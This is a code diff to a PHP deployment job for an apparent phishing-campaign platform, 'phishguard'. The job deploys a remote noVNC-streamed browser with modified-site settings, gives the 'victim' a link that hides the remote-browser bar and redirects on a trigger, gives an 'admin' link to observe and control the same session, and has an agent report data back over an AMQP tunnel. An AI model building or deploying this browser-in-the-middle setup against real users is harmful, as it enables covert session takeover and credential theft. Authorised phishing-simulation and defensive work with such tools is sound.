@@ -66,6 +66,10 @@ class DeployCampaign implements ShouldQueue
         $dir    = '/opt/phishguard/campaign-' . $campaign->id;
         $project = 'phishguard_c' . $campaign->id;
 
+        // Public AMQP URL the remote agent dials back on (the tunnel). Without
+        // it the agent can't report data; we still deploy the browser.
+        $amqpPublic = env('DEPLOY_AMQP_PUBLIC_URL');
+
         if (! $repo) {
             $this->fail($deployment, 'No Git repository URL is set. Add one on the campaign or set DEPLOY_REPO_URL.');
             return;
@@ -124,25 +128,86 @@ class DeployCampaign implements ShouldQueue
                 fi
                 SH);
 
-            // ── 3. Build and start the campaign containers ────────────────────
+            // ── 3a. Seed the Site Tweaker extension with this campaign's tweaks
+            // so the deployed browser shows the modified site automatically. The
+            // JSON is base64'd to survive the SSH shell untouched.
+            $tweaks = $campaign->site_tweaks ?: '{"version":1,"pages":{}}';
+            $tweaksB64 = base64_encode($tweaks);
+            // Trigger → redirect config consumed by the extension's bridge.
+            $campaignCfg = json_encode([
+                'trigger_action'  => $campaign->trigger_action,
+                'redirect_type'   => $campaign->redirect_type,
+                'redirect_target' => $campaign->redirect_target,
+            ]);
+            $cfgB64 = base64_encode($campaignCfg);
+            $this->runStep($ssh, $deployment, 'Applying site tweaks', <<<SH
+                set -e
+                cd {$dirQ}
+                echo '{$tweaksB64}' | base64 -d > site-tweaker/site-tweaker/seed.json
+                echo '{$cfgB64}' | base64 -d > site-tweaker/site-tweaker/campaign.json
+                echo "seed.json + campaign.json written"
+                SH);
+
+            // ── 3b. Build and start the campaign containers ───────────────────
+            $amqpQ    = escapeshellarg($amqpPublic ?: 'amqp://guest:guest@rabbitmq:5672/');
+            $agentQ   = escapeshellarg((string) $campaign->agent_id);
+            $cidQ     = escapeshellarg((string) $campaign->uuid);
+            if (! $amqpPublic) {
+                $deployment->pushLog("\n[warn] DEPLOY_AMQP_PUBLIC_URL is not set — the agent will not be able to report data back. Set it to your broker tunnel.\n");
+            }
             $this->runStep($ssh, $deployment, 'Starting containers', <<<SH
                 set -e
                 cd {$dirQ}
                 export START_URL={$targetQ}
                 export NOVNC_PORT={$webPort}
-                docker compose -f deploy/campaign-compose.yml -p {$project} up -d --build
+                export PHISHGUARD_AMQP_URL={$amqpQ}
+                export PHISHGUARD_AGENT_ID={$agentQ}
+                export PHISHGUARD_CAMPAIGN_ID={$cidQ}
+                # Free the noVNC port from any previous campaign on this server
+                # (one browser preview per port). Removes only containers bound
+                # to this exact host port.
+                for c in \$(docker ps -q --filter "publish={$webPort}"); do
+                    echo "Freeing port {$webPort} (stopping container \$c)"
+                    docker rm -f "\$c" >/dev/null 2>&1 || true
+                done
+                docker compose -f deploy/campaign-compose.yml -p {$project} up -d --build --remove-orphans
                 docker compose -f deploy/campaign-compose.yml -p {$project} ps
                 SH);
 
-            // ── 4. Publish the link ───────────────────────────────────────────
-            $link = "http://{$host}:{$webPort}/vnc_lite.html?autoconnect=true&scale=true";
+            // ── 4. Send the activate command to the agent (best-effort) ───────
+            if ($amqpPublic) {
+                try {
+                    app(\App\Services\RabbitMq::class)->publishCommand(
+                        'campaign.activate',
+                        (string) $campaign->uuid,
+                        (string) $campaign->agent_id,
+                        [
+                            'mode'    => 'investigation',
+                            'browser' => ['engine' => 'chromium', 'novnc_enabled' => true],
+                            'features' => ['event_monitoring' => true],
+                        ],
+                    );
+                    $deployment->pushLog("Sent campaign.activate command to the agent.\n");
+                } catch (Throwable $e) {
+                    $deployment->pushLog("[warn] Could not publish activate command: {$e->getMessage()}\n");
+                }
+            }
+
+            // ── 5. Publish the links ──────────────────────────────────────────
+            // Same session, two views: the victim link redirects on the trigger
+            // and hides the noVNC bar; the admin link observes/controls with the
+            // bar and no redirect.
+            $base = "http://{$host}:{$webPort}/pgvnc.html?autoconnect=true&scale=true";
+            $link = "{$base}&redirect=1";
+            $adminLink = $base;
             $deployment->update([
                 'status'       => 'success',
                 'current_step' => 'Done',
                 'link'         => $link,
+                'admin_link'   => $adminLink,
                 'finished_at'  => now(),
             ]);
-            $deployment->pushLog("\n✔ Deployment complete.\nModified site: {$link}\n");
+            $deployment->pushLog("\nDeployment complete.\nVictim view: {$link}\nAdmin view:  {$adminLink}\n");
 
             $ssh->disconnect();
         } catch (Throwable $e) {
